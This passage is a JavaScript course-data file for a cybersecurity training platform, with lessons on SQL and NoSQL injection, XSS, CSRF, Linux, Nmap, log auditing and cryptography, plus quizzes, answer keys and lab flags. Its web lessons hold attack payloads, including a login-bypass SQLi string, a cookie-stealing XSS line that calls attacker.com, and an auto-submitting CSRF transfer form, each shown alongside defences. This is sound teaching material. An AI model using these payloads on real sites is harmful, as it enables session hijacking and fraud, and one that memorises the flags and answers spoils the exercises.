
export const ALL_LEARNING_PATHS = [
  {
    id: 'web-sec',
    title: 'Web Application Security',
    slug: 'web-security',
    description: 'Learn to identify, exploit, and patch modern web vulnerabilities including the OWASP Top 10.',
    icon: 'Globe',
    xpReward: 1200,
    modules: [
      {
        id: 'web-sec-mod-1',
        title: 'Injection & Scripting',
        description: 'Understand how dynamic injection occurs and how to exploit and mitigate SQLi and XSS.',
        lessons: [
          {
            id: 'web-sec-les-1',
            title: 'SQL Injection Fundamentals',
            duration: '20 mins',
            difficulty: 'Beginner',
            xpReward: 150,
            learningObjectives: [
              'Understand how SQL databases handle user input',
              'Identify vulnerable entry points in dynamic web applications',
              'Understand union-based SQL injection payloads'
            ],
            interactiveDiagramType: 'sql-inject',
            readingMaterial: `### What is SQL Injection (SQLi)?
SQL Injection (SQLi) is a critical web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

#### How SQLi Works
When an application takes user input and concatenates it directly into a database query string without prior sanitization or parameterized inputs:

\`\`\`sql
-- Vulnerable query construction
SELECT * FROM users WHERE username = '` + "`" + ` + userInput + ` + "`" + `' AND password = '` + "`" + ` + userPass + ` + "`" + `'
\`\`\`

If a user enters \`admin' OR '1'='1\` for the username and anything for the password, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
\`\`\`
Since \`'1'='1'\` is always true, the database returns the admin user record, effectively bypassing login authentication!

#### Union-Based SQLi
The \`UNION\` operator allows you to execute one or more additional SELECT queries and append the results to the original query.
\`\`\`sql
' UNION SELECT null, username, password FROM users-- -
\`\`\`
To perform a union-based attack, you must satisfy two requirements:
1. The injected query must return the exact same number of columns as the original query.
2. The data types of the columns in each query must be compatible.`,
            practicalTask: {
              instruction: "Deploy Lab 'SQL Injection Basics' and query the database version. Find the version of SQL and input the flag found in the admin table.",
              targetIp: "10.10.10.45",
              hint: "Try injecting: ' UNION SELECT 'flag', flag_val FROM flags-- -",
              flagRequired: true,
              flag: "THM{sql_inject_master_783}"
            },
            quiz: [
              {
                id: 'web-sec-les-1-q1',
                type: 'mcq',
                text: 'What is the root cause of SQL Injection vulnerabilities?',
                options: [
                  'Overly permissive firewalls',
                  'Concatenating untrusted user input directly into SQL commands',
                  'Using PostgreSQL instead of MySQL',
                  'Enabling Javascript in the browser'
                ],
                correctAnswer: 'Concatenating untrusted user input directly into SQL commands',
                explanation: 'SQL Injection occurs because the web application fails to separate code commands from user-supplied data, resulting in the database executing the input as executable queries.'
              },
              {
                id: 'web-sec-les-1-q2',
                type: 'fill-blank',
                text: 'The SQL injection payload syntax characters -- represent a database __________, which is used to ignore the rest of the original query.',
                correctAnswer: 'comment',
                explanation: 'A comment indicator tells the database to treat the remaining part of the pre-written SQL query as a comment, effectively stripping away password checks or extra conditions.'
              },
              {
                id: 'web-sec-les-1-q3',
                type: 'mcq',
                text: 'Which SQL operator is commonly used to combine rows from multiple SELECT statements to extract sensitive table records?',
                options: [
                  'JOIN',
                  'UNION',
                  'MERGE',
                  'GROUP BY'
                ],
                correctAnswer: 'UNION',
                explanation: 'The UNION operator is used to combine the result-set of two or more SELECT statements, allowing attackers to query other tables in the database.'
              },
              {
                id: 'web-sec-les-1-q4',
                type: 'fill-blank',
                text: 'What is the name of the placeholder column technique (e.g. NULL) used to determine the exact __________ count of the original query?',
                correctAnswer: 'column',
                explanation: 'Attackers must match the exact column count of the original query when performing a UNION injection, often by testing with NULL values.'
              },
              {
                id: 'web-sec-les-1-q5',
                type: 'mcq',
                text: 'To prevent SQL Injection, which of the following is the most robust defensive technique?',
                options: [
                  'Using client-side HTML validations',
                  'Replacing single quotes with double quotes',
                  'Using parameterized queries / prepared statements',
                  'Reinstalling the database server'
                ],
                correctAnswer: 'Using parameterized queries / prepared statements',
                explanation: 'Parameterized queries (prepared statements) pre-compile the SQL query on the server and treat user inputs strictly as parameters, never as executable code.'
              }
            ]
          },
          {
            id: 'web-sec-les-2',
            title: 'Cross-Site Scripting (XSS)',
            duration: '25 mins',
            difficulty: 'Intermediate',
            xpReward: 200,
            learningObjectives: [
              'Distinguish between Stored, Reflected, and DOM-based XSS',
              'Execute basic payload scripts to steal session tokens',
              'Implement proper context-aware output encoding'
            ],
            interactiveDiagramType: 'xss-flow',
            readingMaterial: `### Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into otherwise trusted websites. XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping.

#### Types of XSS
1. **Stored XSS (Persistent)**: The malicious script is permanently stored on the target server (e.g., in a database, comment section). When a victim requests the stored resource, the script executes in their browser.
2. **Reflected XSS (Non-Persistent)**: The script is part of the request sent to the server (e.g., in query parameters) and is "reflected" back immediately in the response. The victim must click a crafted malicious link.
3. **DOM-based XSS**: The vulnerability exists entirely in client-side code. The client-side JavaScript handles input from a source (like \`location.search\`) unsafely and writes it to the DOM.

#### Example XSS Payloads
- Simple popup verification:
  \`\`\`html
  <script>alert(document.domain)</script>
  \`\`\`
- Cookie theft (Session Hijacking):
  \`\`\`html
  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  \`\`\`

#### Mitigation
- **Output Encoding**: Convert characters to safe formats before printing them to the screen (e.g., \`<\` becomes \`&lt;\`).
- **Content Security Policy (CSP)**: Deploy strong HTTP headers that restrict the sources of executable scripts.`,
            practicalTask: {
              instruction: "Test input fields for dynamic script rendering. Inject a script that executes cookies output. Retrieve the flag generated in the alert dashboard.",
              targetIp: "10.10.10.45",
              hint: "Try placing a payload like <script>alert('flag')</script> in the vulnerability comment form.",
              flagRequired: true,
              flag: "THM{reflected_xss_cookies_99}"
            },
            quiz: [
              {
                id: 'web-sec-les-2-q1',
                type: 'mcq',
                text: 'Which type of XSS stores the malicious payload permanently in a database?',
                options: [
                  'Reflected XSS',
                  'DOM-based XSS',
                  'Stored XSS',
                  'Blind Command XSS'
                ],
                correctAnswer: 'Stored XSS',
                explanation: 'Stored XSS involves saving the payload on the database or server filesystem, meaning anyone who visits that page later will execute the script automatically.'
              },
              {
                id: 'web-sec-les-2-q2',
                type: 'match',
                text: 'Match the XSS terms to their descriptions:',
                pairs: [
                  { key: 'Stored XSS', value: 'Saved in db, executes on subsequent loads.' },
                  { key: 'Reflected XSS', value: 'Passed via URL parameters, reflected in response.' },
                  { key: 'DOM XSS', value: 'Executed entirely in browser via client JS.' }
                ],
                correctAnswer: 'match-correct',
                explanation: 'Stored is persistent; Reflected is query-based and transient; DOM XSS is entirely client-side manipulation.'
              },
              {
                id: 'web-sec-les-2-q3',
                type: 'mcq',
                text: 'Which of the following represents an effective mitigation technique against Reflected XSS?',
                options: [
                  'Using SSL/TLS certificates',
                  'Context-aware output encoding',
                  'Disabling cookies completely',
                  'Running database index updates'
                ],
                correctAnswer: 'Context-aware output encoding',
                explanation: 'Output encoding converts special input characters into safe HTML entities (e.g., < to &lt;), preventing the browser from parsing them as executable scripts.'
              },
              {
                id: 'web-sec-les-2-q4',
                type: 'fill-blank',
                text: 'What browser data property (often targeted in session hijacking XSS attacks) can be protected by setting the HttpOnly flag? document._________',
                correctAnswer: 'cookie',
                explanation: 'The HttpOnly flag on cookies blocks client-side JavaScript access via document.cookie, making it harder for XSS attacks to hijack active sessions.'
              },
              {
                id: 'web-sec-les-2-q5',
                type: 'mcq',
                text: 'Which security HTTP response header allows operators to restrict the source of executable scripts and stylesheets?',
                options: [
                  'Content-Security-Policy (CSP)',
                  'Strict-Transport-Security (HSTS)',
                  'X-Frame-Options',
                  'Access-Control-Allow-Origin'
                ],
                correctAnswer: 'Content-Security-Policy (CSP)',
                explanation: 'Content Security Policy (CSP) restricts the resources (such as JavaScript, CSS, Images) that the browser is allowed to load for a given page.'
              }
            ]
          },
          {
            id: 'web-sec-les-3',
            title: 'NoSQL Injection Prevention',
            duration: '15 mins',
            difficulty: 'Intermediate',
            xpReward: 180,
            learningObjectives: [
              'Understand how NoSQL databases are vulnerable to logical injection',
              'Examine MongoDB query operator payloads (e.g. $gt, $ne)',
              'Implement request-level query sanitization defenses'
            ],
            interactiveDiagramType: 'nosql-inject',
            readingMaterial: `### NoSQL Injection Prevention
NoSQL injection occurs when a web application takes untrusted input and passes it directly to a NoSQL database engine (such as MongoDB, CouchDB, or Redis) without proper type validation or query parameter isolation.

#### The Mechanics of MongoDB Operator Injection
Unlike traditional SQL databases that parse strings into command trees, MongoDB utilizes JavaScript objects for querying. If an application accepts raw JSON or uncoerced query parameter types, an attacker can substitute string literals with control objects:

\`\`\`json
// Vulnerable Server-side filter
User.findOne({ username: req.body.username, password: req.body.password })
\`\`\`

If an attacker transmits the following JSON payload:
\`\`\`json
{ "username": "admin", "password": { "$ne": "wrongpassword" } }
\`\`\`

The query becomes: "Find any user where username is admin and password is NOT EQUAL to wrongpassword". Since the admin's password is not equal to that string, the database returns the admin record and the attacker bypasses authentication!

#### Defense & Mitigation Strategies
1. **Input Coercion & Schema Enforcement**: Ensure inputs match strictly defined types (e.g., if a field expects a string, enforce it as a string).
2. **Key Sanitization (mongo-sanitize)**: Use specialized middleware to strip any object keys that start with a dollar sign (\`$\`) or contain dots (\`.\`), which MongoDB uses for operator commands.
3. **Mongoose Schemas**: Mongoose automatically casts incoming values to their defined schema types. However, schema-less structures or raw queries remain vulnerable.`,
            practicalTask: {
              instruction: "Check out the new live security telemetry dashboard. Trigger a NoSQL attack by sending any chat message or field input containing a MongoDB operator (like {'$gt': ''}) and notice the system intercepting it in real time!",
              hint: "Send a message with '$gt' in the chat panel to see the active NoSQL prevent guard block and log it.",
              flagRequired: false
            },
            quiz: [
              {
                id: 'web-sec-les-3-q1',
                type: 'mcq',
                text: 'What is the primary difference in attack vectors between SQL Injection and NoSQL Injection?',
                options: [
                  'SQLi targets only Linux servers while NoSQLi targets Windows.',
                  'NoSQLi targets document database operator structures rather than relational string command parsers.',
                  'NoSQLi requires compiling binary buffer overflows.',
                  'SQLi cannot be executed over HTTP requests.'
                ],
                correctAnswer: 'NoSQLi targets document database operator structures rather than relational string command parsers.',
                explanation: 'NoSQL databases query using structured objects or key-value pairs rather than string queries, meaning attacks exploit operator properties (like $ne, $gt) instead of traditional SQL syntax keywords.'
              },
              {
                id: 'web-sec-les-3-q2',
                type: 'fill-blank',
                text: 'In MongoDB, query operators are prefixed with the special character __________, which is stripped by sanitizers to block NoSQL Injection.',
                correctAnswer: '$',
                explanation: 'MongoDB query operators (such as $eq, $ne, $gt, $or) always start with the "$" symbol. Deleting or blocking keys starting with this symbol completely prevents injection.'
              },
              {
                id: 'web-sec-les-3-q3',
                type: 'mcq',
                text: 'Which operator can an attacker use in a login form to bypass authentication by checking for records NOT equal to a dummy password?',
                options: [
                  '$gt',
                  '$ne',
                  '$eq',
                  '$exists'
                ],
                correctAnswer: '$ne',
                explanation: '$ne stands for "not equal". Injecting { password: { "$ne": "randomstring" } } returns any user record whose password is not "randomstring" (which is almost always true).'
              }
            ]
          },
          {
            id: 'web-sec-les-4',
            title: 'CSRF Tokens & Session Defense',
            duration: '20 mins',
            difficulty: 'Intermediate',
            xpReward: 200,
            learningObjectives: [
              'Understand Cross-Site Request Forgery (CSRF) mechanics',
              'Differentiate between SameSite cookie flags and anti-CSRF tokens',
              'Implement a stateful double-submit cookie token pattern'
            ],
            interactiveDiagramType: 'csrf-flow',
            readingMaterial: `### CSRF Tokens & Session Defense
Cross-Site Request Forgery (CSRF) is a vulnerability that forces an end user to execute unwanted actions on a web application in which they are currently authenticated.

#### How CSRF Works
If a user is logged into their bank website (\`bank.com\`) and has an active session cookie, their browser automatically appends that cookie to *any* request sent to \`bank.com\`.
If the user visits a malicious site (\`evil.com\`), the malicious site can load a hidden form:

\`\`\`html
<!-- Hidden CSRF attack payload -->
<form action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="5000" />
  <input type="hidden" name="to" value="attacker_account" />
</form>
<script>document.forms[0].submit();</script>
\`\`\`

The victim's browser submits the form to \`bank.com\` and automatically attaches the victim's session cookies. The bank server processes the request as authenticated, stealing the funds!

#### Effective Protections
1. **Anti-CSRF Tokens (Double Submit)**: The server generates a unique cryptographically secure random token linked to the session. When the client makes mutating requests (POST, PUT, DELETE), they must send this token in a custom HTTP header (like \`X-CSRF-Token\`). The server validates it before executing.
2. **SameSite Cookie Attribute**: Set \`SameSite=Lax\` or \`SameSite=Strict\` on session cookies. This instructs the browser to *never* attach the cookie to cross-site requests, blocking CSRF attempts completely.`,
            practicalTask: {
              instruction: "Inspect your cookies in the browser. You should find an XSRF-TOKEN cookie generated by our active security shield. This token is dynamically validated on all your course completions, chats, and logins!",
              hint: "Anti-CSRF tokens are required for all POST/PUT/DELETE requests to our system api endpoints.",
              flagRequired: false
            },
            quiz: [
              {
                id: 'web-sec-les-4-q1',
                type: 'mcq',
                text: 'What is the main driver behind why CSRF attacks are possible?',
                options: [
                  'JavaScript has access to private keys on the local machine.',
                  'Browsers automatically append relevant session cookies to requests regardless of where the request originated.',
                  'Servers do not require password encryption in HTTP headers.',
                  'Firewalls always allow incoming HTTP traffic.'
                ],
                correctAnswer: 'Browsers automatically append relevant session cookies to requests regardless of where the request originated.',
                explanation: 'By default, browsers include cookies matching the destination domain in every request to that domain, even if the request was initiated by an external, malicious script.'
              },
              {
                id: 'web-sec-les-4-q2',
                type: 'mcq',
                text: 'Which Cookie attribute instructs the browser not to attach cookies to cross-site requests, mitigating many CSRF threats?',
                options: [
                  'HttpOnly',
                  'Secure',
                  'SameSite',
                  'Domain'
                ],
                correctAnswer: 'SameSite',
                explanation: 'SameSite restricts cookies from being sent on cross-site requests (values: Lax, Strict, None), protecting users from session riding attacks.'
              },
              {
                id: 'web-sec-les-4-q3',
                type: 'fill-blank',
                text: 'To protect mutating requests, developers require a custom HTTP header like X-CSRF-__________ to be sent with every request and verified on the server.',
                correctAnswer: 'Token',
                explanation: 'A custom request header (commonly named X-CSRF-Token or X-XSRF-Token) holds the cryptographically secure token that the server matches against the user session to verify origin authenticity.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'linux-fund',
    title: 'Linux Fundamentals',
    slug: 'linux-fundamentals',
    description: 'Master the command line interface (CLI), file security models, and bash shell scripting.',
    icon: 'Terminal',
    xpReward: 800,
    modules: [
      {
        id: 'linux-mod-1',
        title: 'Core CLI Mastery',
        description: 'Navigate systems, manipulate files, and inspect permission systems.',
        lessons: [
          {
            id: 'linux-les-1',
            title: 'Essential Commands & Directory Navigation',
            duration: '15 mins',
            difficulty: 'Beginner',
            xpReward: 100,
            learningObjectives: [
              'Understand absolute vs relative directories',
              'Manipulate files (mv, cp, rm, mkdir)',
              'Examine system parameters (whoami, hostname, cat, grep)'
            ],
            readingMaterial: `### Navigating the Linux File System
Linux stores files in a single unified hierarchical tree, starting at the root directory \`/\`. 

#### Primary Commands
- \`pwd\` - Print Working Directory: Tells you where you currently are.
- \`ls\` - List: Lists files and subdirectories. Use \`ls -la\` to view hidden files and full privileges.
- \`cd\` - Change Directory: Navigate between folders.
  - \`cd ..\` moves up one level.
  - \`cd ~\` moves to your home directory.
- \`cat\` - Concatenate: Displays the text inside a file to the screen.
- \`grep\` - Global Regular Expression Print: Searches text files for patterns.
  - \`cat access.log | grep "404"\` lists all lines containing HTTP status code 404.

#### Permissions System
Every file and folder has ownership divided into three scopes:
- **User (Owner)**
- **Group**
- **Others (Anyone else)**

Privileges are specified as Read (\`r\` / 4), Write (\`w\` / 2), and Execute (\`x\` / 1). 
\`chmod 755 file.sh\` gives full privileges to User, and read/execute privileges to Group and Others.`,
            practicalTask: {
              instruction: "Launch your Kali Terminal, navigate to the \`/home/student/challenges\` directory, and read the flag file.",
              hint: "Run: 'cd /home/student/challenges && cat flag.txt'",
              flagRequired: true,
              flag: "THM{linux_terminal_pioneer_419}"
            },
            quiz: [
              {
                id: 'linux-les-1-q1',
                type: 'mcq',
                text: 'Which chmod permission value gives owner Read, Write, Execute, and others Read-only?',
                options: [
                  'chmod 777',
                  'chmod 744',
                  'chmod 644',
                  'chmod 755'
                ],
                correctAnswer: 'chmod 744',
                explanation: '7 (User = 4+2+1) grants full access, 4 (Group = Read only) and 4 (Others = Read only) results in 744.'
              },
              {
                id: 'linux-les-1-q2',
                type: 'mcq',
                text: 'Which utility is used to search plain-text datasets for lines matching a regular expression?',
                options: [
                  'find',
                  'grep',
                  'locate',
                  'cat'
                ],
                correctAnswer: 'grep',
                explanation: 'The grep command searches text files for lines that match a specified regular expression and prints them.'
              },
              {
                id: 'linux-les-1-q3',
                type: 'fill-blank',
                text: 'In Linux, what absolute character path denotes the top-level starting root directory of the entire filesystem hierarchical tree?',
                correctAnswer: '/',
                explanation: 'The single forward slash (/) represents the root directory in Linux, which serves as the parent of all files and subdirectories.'
              },
              {
                id: 'linux-les-1-q4',
                type: 'mcq',
                text: 'What command displays the current absolute path of the directory you are working in?',
                options: [
                  'whereami',
                  'pwd',
                  'cd',
                  'ls'
                ],
                correctAnswer: 'pwd',
                explanation: 'The pwd (print working directory) command prints the full pathname of the current working directory.'
              },
              {
                id: 'linux-les-1-q5',
                type: 'fill-blank',
                text: 'Which flag combined with chmod adds execution privileges to a shell script file (e.g. chmod _____ script.sh)?',
                correctAnswer: '+x',
                explanation: 'Applying +x with chmod adds executable permission for user, group, and others on that file.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'eth-hack',
    title: 'Ethical Hacking & Pentesting',
    slug: 'ethical-hacking',
    description: 'Learn offensive methodologies: reconnaissance, host vulnerability scanning, and exploitation.',
    icon: 'ShieldAlert',
    xpReward: 1500,
    modules: [
      {
        id: 'eth-hack-mod-1',
        title: 'Recon & Reconnaissance',
        description: 'Explore target ports and identify outdated services using Nmap and banner grabbing.',
        lessons: [
          {
            id: 'eth-hack-les-1',
            title: 'Nmap Port Scanning Basics',
            duration: '25 mins',
            difficulty: 'Intermediate',
            xpReward: 200,
            learningObjectives: [
              'Understand active scanning mechanics',
              'Identify the difference between SYN scan (-sS) and TCP scan (-sT)',
              'Run service version detection scans (-sV)'
            ],
            interactiveDiagramType: 'tcp',
            readingMaterial: `### Network Reconnaissance with Nmap
Network Mapper (Nmap) is an open-source tool for network exploration and security auditing. It is a standard tool used by penetration testers to map networks and identify live services.

#### How Port Scanning Works
Nmap sends custom packets to target IP addresses and analyzes responses to determine if ports are **open**, **closed**, or **filtered** by a firewall.

#### Essential Nmap Scan Types
1. **TCP Connect Scan (\`-sT\`):** Performs a full 3-way TCP handshake (SYN, SYN-ACK, ACK). It is very accurate but easily logged by firewalls.
2. **SYN Stealth Scan (\`-sS\`):** The default scan type. It sends a SYN packet and waits for SYN-ACK. If received, it immediately sends a RST (Reset) packet to tear down the connection. The handshake is never fully completed, making it stealthy.
3. **Service Detection (\`-sV\`):** Probes open ports to identify the exact service name, application product, and software version running.
4. **OS Detection (\`-O\`):** Probes TCP/IP stack implementation variations to estimate the host operating system.

#### Example Command
\`\`\`bash
nmap -sS -sV -p 21,22,80 10.10.12.8
\`\`\`
This scans target \`10.10.12.8\` on ports 21 (FTP), 22 (SSH), and 80 (HTTP) using a stealthy SYN scan and version detection.`,
            practicalTask: {
              instruction: "Execute Nmap in the embedded Kali terminal on target 10.10.12.8. Find which port hosts a hidden service, log in, and find the flag.",
              hint: "Type: 'nmap -sV 10.10.12.8' inside the terminal window.",
              flagRequired: true,
              flag: "THM{nmap_recon_specialist_2026}"
            },
            quiz: [
              {
                id: 'eth-hack-les-1-q1',
                type: 'mcq',
                text: 'Which scan flag is used in Nmap to conduct a stealthy TCP SYN scan?',
                options: [
                  '-sT',
                  '-sS',
                  '-sV',
                  '-sA'
                ],
                correctAnswer: '-sS',
                explanation: 'The -sS flag stands for SYN Scan, which is also referred to as a half-open or stealth scan because it doesn\'t open a full TCP connection.'
              },
              {
                id: 'eth-hack-les-1-q2',
                type: 'mcq',
                text: 'What status does Nmap report for a port that is protected by an active firewall blocking incoming probes?',
                options: [
                  'open',
                  'closed',
                  'filtered',
                  'unreachable'
                ],
                correctAnswer: 'filtered',
                explanation: 'A filtered port indicates that Nmap cannot determine whether the port is open or closed because packet filtering (such as a firewall) prevents its probes from reaching the port.'
              },
              {
                id: 'eth-hack-les-1-q3',
                type: 'fill-blank',
                text: 'Which standard Nmap parameter is used to probe open ports to determine the exact software product and version running? (e.g. -s__)',
                correctAnswer: '-sV',
                explanation: 'The -sV parameter conducts service version detection, helping penetration testers identify outdated software with public vulnerabilities.'
              },
              {
                id: 'eth-hack-les-1-q4',
                type: 'mcq',
                text: 'In a traditional TCP Connect scan (-sT), what is the final packet type sent by the scanning host to complete the standard 3-way handshake?',
                options: [
                  'SYN',
                  'SYN-ACK',
                  'ACK',
                  'RST'
                ],
                correctAnswer: 'ACK',
                explanation: 'The TCP Connect scan performs a full 3-way handshake: the client sends SYN, gets SYN-ACK, and completes with an ACK packet before disconnecting.'
              },
              {
                id: 'eth-hack-les-1-q5',
                type: 'fill-blank',
                text: 'To scan a specific range or set of ports (e.g., port 80 and 443) using Nmap, you use the ________ parameter followed by the port list.',
                correctAnswer: '-p',
                explanation: 'The -p flag allows users to specify ports, e.g., -p 80,443 or -p 1-1000.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'soc-analyst',
    title: 'SOC Analyst / Blue Teaming',
    slug: 'soc-analyst',
    description: 'Learn cyber defense: trace logs, detect suspicious activities, and analyze real SIEM events.',
    icon: 'Eye',
    xpReward: 1400,
    modules: [
      {
        id: 'soc-mod-1',
        title: 'Security Auditing & Logs',
        description: 'Read server log formats and filter security incidents.',
        lessons: [
          {
            id: 'soc-les-1',
            title: 'Authentication Log Auditing',
            duration: '20 mins',
            difficulty: 'Intermediate',
            xpReward: 150,
            learningObjectives: [
              'Understand Linux /var/log/auth.log contents',
              'Trace brute force SSH attacks',
              'Isolate compromise credentials logs'
            ],
            readingMaterial: `### Security Auditing & Logs Analysis
To successfully defend networks, defensive security analysts (Blue Teamers) in a Security Operations Center (SOC) inspect event logs to locate evidence of hacker reconnaissance or intrusion.

#### Investigating Auth Logs (/var/log/auth.log)
In Unix systems, authorization log messages are written to \`/var/log/auth.log\`. Every login attempt (successful or failed), sudo escalation, and ssh session is logged here.

#### Tracing a Brute Force SSH Attack
A typical SSH brute force script will try thousands of password combinations within seconds. In the logs, this exhibits a rapid burst of:
\`\`\`
Jun 25 02:11:05 server sshd[4012]: Failed password for invalid user admin from 192.168.1.102 port 43220 ssh2
Jun 25 02:11:06 server sshd[4015]: Failed password for invalid user admin from 192.168.1.102 port 43222 ssh2
\`\`\`
Look for:
- High frequency of failures from the same IP address
- Multiples login names tried
- A final \`Accepted password\` line which indicates a successful compromise.`,
            practicalTask: {
              instruction: "Examine the log provided in the packet/log analysis quiz below. Find the IP of the attacker and submit it as the flag.",
              hint: "Look at the log lines. Which IP is spamming 'Failed password'?",
              flagRequired: true,
              flag: "185.220.101.44"
            },
            quiz: [
              {
                id: 'soc-les-1-q1',
                type: 'log-analysis',
                text: 'Inspect the log segment below. Identify the malicious IP attempting a brute-force attack and input it:',
                logContent: `Jun 25 02:00:10 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55102 ssh2
Jun 25 02:00:11 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55104 ssh2
Jun 25 02:00:12 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55108 ssh2
Jun 25 02:00:15 mail sshd[1024]: Accepted password for root from 185.220.101.44 port 55112 ssh2
Jun 25 02:00:16 mail sshd[1024]: pam_unix(sshd:session): session opened for user root by (uid=0)`,
                correctAnswer: '185.220.101.44',
                explanation: 'The IP 185.220.101.44 is the source of multiple failed root authentication attempts, followed by a successful login, representing a successful SSH brute-force attack.'
              },
              {
                id: 'soc-les-1-q2',
                type: 'mcq',
                text: 'In a Linux system, what is the default log file where authorization events, failed logins, and sudo elevations are stored?',
                options: [
                  '/var/log/syslog',
                  '/var/log/auth.log',
                  '/var/log/nginx/access.log',
                  '/etc/shadow'
                ],
                correctAnswer: '/var/log/auth.log',
                explanation: '/var/log/auth.log contains system authorization and security logs.'
              },
              {
                id: 'soc-les-1-q3',
                type: 'fill-blank',
                text: 'An automated brute-force SSH attack is easily identified in logs by a high frequency of __________ password events from a single IP address.',
                correctAnswer: 'failed',
                explanation: 'Brute-force login tools test thousands of passwords, leading to a massive volume of "failed password" entries in a very short duration.'
              },
              {
                id: 'soc-les-1-q4',
                type: 'mcq',
                text: "What does a 'pam_unix(sshd:session): session opened' entry in the auth.log file indicate?",
                options: [
                  'An active firewall block event',
                  'The Pluggable Authentication Module successfully established a session for the user',
                  'A hardware socket failure',
                  'An invalid cryptographic certificate'
                ],
                correctAnswer: 'The Pluggable Authentication Module successfully established a session for the user',
                explanation: 'This log entry confirms that PAM (Pluggable Authentication Modules) has successfully validated credentials and created an active shell session.'
              },
              {
                id: 'soc-les-1-q5',
                type: 'fill-blank',
                text: 'What is the standard name of the service daemon responsible for logging SSH remote connections inside the auth.log file?',
                correctAnswer: 'sshd',
                explanation: 'sshd is the SSH server daemon that listens for incoming connections and generates authentication log entries.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'crypto-enc',
    title: 'Cryptography & Encryption',
    slug: 'cryptography',
    description: 'Learn the core elements of symmetric and asymmetric cryptography, hash functions, and cracking insecure ciphers.',
    icon: 'Key',
    xpReward: 1100,
    modules: [
      {
        id: 'crypto-mod-1',
        title: 'Cryptographic Mechanisms',
        description: 'Understand core symmetric algorithms, public/private keys, and data integrity hashes.',
        lessons: [
          {
            id: 'crypto-les-1',
            title: 'Symmetric vs Asymmetric Encryption',
            duration: '20 mins',
            difficulty: 'Beginner',
            xpReward: 120,
            learningObjectives: [
              'Distinguish symmetric key systems from asymmetric keypairs',
              'Understand Caesar / ROT13 ciphers and frequency vulnerability',
              'Explore hashing mechanisms (MD5, SHA-256) and integrity verification'
            ],
            interactiveDiagramType: 'crypto-handshake',
            readingMaterial: `### Cryptographic Fundamentals
Cryptography is the practice and study of techniques for securing communication in the presence of adversarial behavior. It forms the backbone of web security (HTTPS), database encryption, and access control.

#### 1. Symmetric Cryptography
Symmetric encryption uses the **exact same key** for both encryption and decryption. Both sender and receiver must possess this secret key.
- **Pros:** Extremely fast and efficient for massive amounts of data.
- **Cons:** Secure key distribution is a major challenge.
- **Examples:** AES (Advanced Encryption Standard), DES, Caesar cipher.

#### 2. Asymmetric Cryptography
Asymmetric encryption uses a mathematically linked **keypair**:
- **Public Key:** Shared with anyone. Used to encrypt data.
- **Private Key:** Kept strictly secret by the owner. Used to decrypt data.
If Bob wants to send an encrypted message to Alice, Bob encrypts it using Alice's *Public Key*. Only Alice can decrypt it using her *Private Key*.
- **Examples:** RSA, Elliptic Curve Cryptography (ECC).

#### 3. Cryptographic Hashing
A cryptographic hash function is a mathematical algorithm that maps arbitrary size data to a **fixed-size bit string** (hash). It is **one-way** (irreversible).
- **Collision Resistance:** Extremely hard to find two different inputs that produce the same hash.
- **Examples:** MD5, SHA-256.`,
            practicalTask: {
              instruction: "Crack the following ROT13 cipher string to retrieve the secret key phrase: 'FLZZRGEVP_XRL_PIN_FUVSG'",
              hint: "ROT13 rotates characters by 13 places. Symmetrical cipher!",
              flagRequired: true,
              flag: "SYMMETRIC_KEY_PIN_SHIFT"
            },
            quiz: [
              {
                id: 'crypto-les-1-q1',
                type: 'mcq',
                text: 'Which type of encryption uses the exact same key for both encryption and decryption operations?',
                options: [
                  'Asymmetric cryptography',
                  'Symmetric cryptography',
                  'One-way cryptographic hashing',
                  'Digital signature validation'
                ],
                correctAnswer: 'Symmetric cryptography',
                explanation: 'Symmetric encryption relies on a single shared secret key that both the encrypting and decrypting parties must agree upon.'
              },
              {
                id: 'crypto-les-1-q2',
                type: 'mcq',
                text: 'What is the primary vulnerability of a simple Caesar or ROT13 rotational cipher?',
                options: [
                  'It requires too much CPU overhead',
                  'It is highly vulnerable to simple frequency analysis due to low keyspace',
                  'It requires a public key infrastructure (PKI)',
                  'It is mathematically irreversible'
                ],
                correctAnswer: 'It is highly vulnerable to simple frequency analysis due to low keyspace',
                explanation: 'Since ROT13 and Caesar ciphers only shift characters within the alphabet, attackers can easily crack them using alphabetical frequency analysis.'
              },
              {
                id: 'crypto-les-1-q3',
                type: 'fill-blank',
                text: 'What cryptographic operation is one-way only, meaning it converts data into a fixed-length string and cannot be mathematically reversed?',
                correctAnswer: 'hashing',
                explanation: 'Hashing is a one-way mathematical function used for integrity checks and password storage, returning a unique signature of the input data.'
              },
              {
                id: 'crypto-les-1-q4',
                type: 'mcq',
                text: 'In Asymmetric Cryptography, which key must Bob use to encrypt a message so that ONLY Alice can read it?',
                options: [
                  'Bob\'s public key',
                  'Bob\'s private key',
                  'Alice\'s public key',
                  'Alice\'s private key'
                ],
                correctAnswer: "Alice's public key",
                explanation: 'By encrypting with Alice\'s public key, the data can only be decrypted with Alice\'s secret, corresponding private key.'
              },
              {
                id: 'crypto-les-1-q5',
                type: 'fill-blank',
                text: 'Which secure hashing algorithm is the standard for modern cryptographic verification, yielding a 256-bit hash value? SHA-________',
                correctAnswer: '256',
                explanation: 'SHA-256 (Secure Hash Algorithm 256-bit) is widely used in TLS, blockchain, and secure file validation.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'cloud-sec',
    title: 'Cloud Security & IAM',
    slug: 'cloud-security',
    description: 'Examine cloud environments, security architecture, policies, and secure Identity and Access Management (IAM) configurations.',
    icon: 'Shield',
    xpReward: 1300,
    modules: [
      {
        id: 'cloud-sec-mod-1',
        title: 'Cloud Infrastructure Security',
        description: 'Understand modern Identity and Access Management and cloud-native vulnerability vectors.',
        lessons: [
          {
            id: 'cloud-les-1',
